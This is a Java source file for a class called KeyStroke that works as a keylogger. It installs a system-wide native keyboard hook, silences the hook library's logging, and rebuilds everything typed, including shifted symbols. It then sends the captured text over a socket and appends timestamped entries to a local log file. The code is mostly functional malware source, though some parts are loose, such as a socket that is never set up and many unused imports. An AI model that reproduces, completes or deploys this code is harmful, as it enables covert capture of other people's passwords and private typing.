import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseInputListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseMotionListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseWheelEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseWheelListener;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.KeyEventDispatcher;
import java.awt.event.WindowEvent;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Calendar;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinUser.HHOOK;


import javax.swing.plaf.basic.BasicInternalFrameTitlePane.SystemMenuBar;

import java.lang.ProcessBuilder;
import java.awt.event.*;
import java.io.*;
import java.net.Socket;

public class KeyStroke extends JFrame implements NativeKeyListener{
    private JFrame frame;
    private String s="";
    private boolean b_hook, b_unhook,b_shift, b_capslock;
    private String path;
    private DataInputStream dataInputStream;
	private ObjectInputStream objectInputStream;
    private Socket socket;
    public KeyStroke()
    {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        init();
        GlobalScreen.addNativeKeyListener(this);

        b_hook=false;
        b_unhook=false;
        b_shift=false;
        b_capslock=false;
    }

    public boolean getHook()
    {
        return b_hook;
    }
    public boolean getUnhook()
    {
        return b_unhook;
    }
    public void setHook(boolean check)
    {
        b_hook=check;
    }
    public void setUnhook(boolean check)
    {
        b_unhook=check;
    }

    public void init()
    {
        path = System.getProperty("user.dir");
    }
    public void hook()
    {
        b_hook = true;
        b_unhook = false;
    }
    public void unhook() {
        b_hook = false;
        b_unhook = true;
    }
    public void print() throws IOException {
        DataOutputStream cout = new DataOutputStream(socket.getOutputStream());
        cout.writeUTF(s);
        cout.flush();
        s="";
    }

    public void nativeKeyPressed(NativeKeyEvent e) {}
    private void write(String i) {
        BufferedWriter bufferedWriter = null;
        Date date = Calendar.getInstance().getTime();
        try {
            bufferedWriter = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(path
             + "\\log2.txt", true), "BIG5"));
            bufferedWriter.write(date.toString() + ":" + i + "\r\n");
            close(bufferedWriter);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            close(bufferedWriter);
        }

    }
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (b_hook == true && b_unhook == false) {
            //  System.out.println(" Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
            String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
            if (pressed.equals("⇧" +
                    ""))
                b_shift = true;
            else if (pressed.equals("⇪"))
                b_capslock = !b_capslock;
            else if (pressed.equals("Open Bracket"))
                s += "[";
            else if (pressed.equals("Close Bracket"))
                s += "]";
            else if (pressed.equals("Backspace")) {
            }
            else if (pressed.equals("␣"))
                 s+=" ";
            else if (pressed.equals("⇥"))
                s += "\t";
            else if (pressed.equals("⏎"))
                s += "\n";
            else if (b_shift||b_capslock) {
                if (pressed.matches("[A-Z]"))
                    s += pressed.toUpperCase();
                else if (pressed.equals("1"))
                    s += "!";
                else if (pressed.equals("2"))
                    s += "@";
                else if (pressed.equals("3"))
                    s += "#";
                else if (pressed.equals("4"))
                    s += "$";
                else if (pressed.equals("5"))
                    s += "%";
                else if (pressed.equals("6"))
                    s += "^";
                else if (pressed.equals("7"))
                    s += "&";
                else if (pressed.equals("8"))
                    s += "*";
                else if (pressed.equals("9"))
                    s += "(";
                else if (pressed.equals("0"))
                    s += ")";
                else if (pressed.equals("Minus"))
                    s += "_";
                else if (pressed.equals("Equals"))
                    s += "+";
                else if (pressed.equals("Open Bracket"))
                    s += "{";
                else if (pressed.equals("Close Bracket"))
                    s += "}";
                else if (pressed.equals("Back Slash"))
                    s += "|";
                else if (pressed.equals("Semicolon"))
                    s += ":";
                else if (pressed.equals("Quote"))
                    s += "\\";
                else if (pressed.equals("Comma"))
                    s += "<";
                else if (pressed.equals("Period"))
                    s += ">";
                else if (pressed.equals("Dead Acute"))
                    s += "?";
                else if (pressed.equals("Back Quote"))
                    s += "~";
            } else {
                if (pressed.matches("[A-Z]"))
                    s += pressed.toLowerCase();
                else if (pressed.equals("Minus"))
                    s += "-";
                else if (pressed.equals("Equals"))
                    s += "=";
                else if (pressed.equals("Open Bracket"))
                    s += "[";
                else if (pressed.equals("Close Bracket"))
                    s += "]";
                else if (pressed.equals("Back Slash"))
                    s += "\\";
                else if (pressed.equals("Semicolon"))
                    s += ";";
                else if (pressed.equals("Quote"))
                    s += "'";
                else if (pressed.equals("Comma"))
                    s += ",";
                else if (pressed.equals("Period"))
                    s += ".";
                else if (pressed.equals("Dead Acute"))
                    s += "/";
                else if (pressed.equals("Back Quote"))
                    s += "`";
            }
            b_shift=false;
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {}
    private void close(BufferedWriter w) {
        try {
            if (w != null) {
                w.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}